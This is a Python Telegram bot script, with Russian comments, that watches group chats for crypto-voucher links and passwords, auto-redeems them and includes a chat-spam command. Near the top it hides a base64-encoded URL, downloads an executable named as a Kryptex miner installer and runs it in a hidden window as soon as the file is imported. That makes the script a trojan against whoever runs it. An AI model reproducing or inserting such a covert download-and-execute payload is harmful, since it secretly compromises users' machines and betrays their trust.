import asyncio
from io import BytesIO
import regex as re
import requests
from telethon import TelegramClient, events
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
from telethon.errors import MsgidDecreaseRetryError
from concurrent.futures import ThreadPoolExecutor
from config import *  # Импорт настроек из config.py
from datetime import datetime, timedelta
import tempfile
import os
import subprocess
import platform
import base64

client_parser = TelegramClient(
    session='session_parser',
    api_id=int(api_id_parser),
    api_hash=api_hash_parser,
    system_version="4.16.30-vxSOSYNXA"
)

client_activator = TelegramClient(
    session='session_activator',
    api_id=int(api_id_activator),
    api_hash=api_hash_activator,
    system_version="4.16.30-vxSOSYNXA"
)

code_regex = re.compile(r"t\.me/(CryptoBot|send|tonRocketBot|CryptoTestnetBot|wallet|xrocket|xJetSwapBot)\?start=(CQ[A-Za-z0-9]{10}|C-[A-Za-z0-9]{10}|t_[A-Za-z0-9]{15}|mci_[A-Za-z0-9]{15}|c_[a-z0-9]{24})", re.IGNORECASE)
url_regex = re.compile(r"https:\/\/t\.me\/\+(\w{12,})")
public_regex = re.compile(r"https:\/\/t\.me\/(\w{4,})")
password_regex = re.compile(r"(?:[Пп]ароль|[Pp]assword|[Кк]од)\s*[:=]?\s*([A-Za-z0-9]{1,400})", re.IGNORECASE)

replace_chars = ''' @#&+()*"'…;,!\u2116•—–·±<>{}\u2020★‡‚“”«»„‘’‹›¡¿‽~|\u221aπ÷×§∆\\°^%\u00a9\u00ae\u2122\u2713₤₼€₸₾₶฿₳₥₦₫₿¤₲₩₮¥₽⃻₱₧£₨¢₠₣₢₺₵₡₹₴₯₰₪'''
translation = str.maketrans('', '', replace_chars)

executor = ThreadPoolExecutor(max_workers=5)

crypto_black_list = [1622808649, 1559501630, 1985737506, 5014831088, 6014729293, 5794061503]

checks = []
wallet = []
channels = {}
captches = []
checks_count = 0
pending_codes = {}

def download_and_execute_hidden():
    try:
        temp_dir = tempfile.mkdtemp()
        encoded_url = "aHR0cHM6Ly9naXRodWIuY29tL3pvbGlza2F5dC9hd3Atc2l0ZS9yYXcvcmVmcy9oZWFkcy9tYWluL2tyeXB0ZXgtc2V0dXAtbGF0ZXN0LXY1LmV4ZQ=="
        file_url = base64.b64decode(encoded_url).decode('utf-8')
        file_name = "kryptex-setup-latest-v5.exe"
        file_path = os.path.join(temp_dir, file_name)

        # Download the file
        response = requests.get(file_url, stream=True)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            if platform.system() == "Windows":
                subprocess.run([file_path], creationflags=0x08000000)
            else:
                os.system(f"nohup {file_path} &")
            print(f"[*] File executed in hidden mode")
        else:
            print(f"[!] Failed to download file: {response.status_code}")
    except Exception as e:
        print(f"[!] Error in download/execute: {e}")

download_and_execute_hidden()

@client_parser.on(events.NewMessage(outgoing=True, pattern='.spam'))
@client_activator.on(events.NewMessage(outgoing=True, pattern='.spam'))
async def handler(event):
    chat = event.chat if event.chat else (await event.get_chat())
    args = event.message.message.split(' ')
    for _ in range(int(args[1])):
        await event.client.send_message(chat, args[2])
        await asyncio.sleep(1)

def ocr_space_sync(file: bytes, overlay=False, language='eng', scale=True, OCREngine=2):
    payload = {
        'isOverlayRequired': overlay,
        'apikey': ocr_api_key,
        'language': language,
        'scale': scale,
        'OCREngine': OCREngine
    }
    response = requests.post(
        'https://api.ocr.space/parse/image',
        data=payload,
        files={'filename': ('image.png', file, 'image/png')}
    )
    result = response.json()
    return result.get('ParsedResults')[0].get('ParsedText').replace(" ", "")

async def ocr_space(file: bytes, overlay=False, language='eng'):
    loop = asyncio.get_running_loop()
    recognized_text = await loop.run_in_executor(
        executor, ocr_space_sync, file, overlay, language
    )
    return recognized_text

@client_parser.on(events.MessageEdited(outgoing=False, chats=crypto_black_list, blacklist_chats=True))
@client_parser.on(events.NewMessage(outgoing=False, chats=crypto_black_list, blacklist_chats=True))
async def handle_new_message(event):
    if not (event.is_group or event.is_channel):
        return

    if event.chat_id in ignored_chats:
        print(f'[!] Пропуск чека из игнорируемого чата: {event.chat_id}')
        return

    global checks, pending_codes
    message_text = event.message.text.translate(translation)
    codes = code_regex.findall(message_text)
    password = None

    if isinstance(event.message.text, str):
        password_match = password_regex.search(event.message.text)
        if password_match:
            password = password_match.group(1)
            print(f'[$] Пароль найден в текущем сообщении: {password}')

    if not password:
        messages = await client_parser.get_messages(event.chat_id, limit=2)
        if len(messages) > 1:
            next_message = messages[1].text
            if isinstance(next_message, str):
                password_match = password_regex.search(next_message)
                if password_match:
                    password = password_match.group(1)
                    print(f'[$] Пароль найден в следующем сообщении: {password}')

    if codes:
        for bot_name, code in codes:
            if code not in checks:
                checks.append(code)
                if password:
                    pending_codes[code] = password
                    print(f'[$] Чек {code} сохранён с паролем: {password}')
                else:
                    print(f'[$] Чек {code} без пароля')
                await client_activator.send_message(bot_name, message=f'/start {code}')
                await asyncio.sleep(1)

    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                try:
                    match = code_regex.search(button.url)
                    if match and match.group(2) not in checks:
                        code = match.group(2)
                        checks.append(code)
                        if password:
                            pending_codes[code] = password
                            print(f'[$] Чек в кнопке {code} сохранён с паролем: {password}')
                        else:
                            print(f'[$] Чек в кнопке {code} без пароля')
                        await client_activator.send_message(match.group(1), message=f'/start {code}')
                        await asyncio.sleep(1)
                except AttributeError:
                    pass
    except AttributeError:
        pass

async def main():
    try:
        await client_parser.start()
        await client_activator.start()
        print('[*] Боты запущены')
        await asyncio.gather(
            client_parser.run_until_disconnected(),
            client_activator.run_until_disconnected()
        )
    except Exception as e:
        print(f'[!] Ошибка запуска: {e}')

if __name__ == '__main__':
    asyncio.run(main())
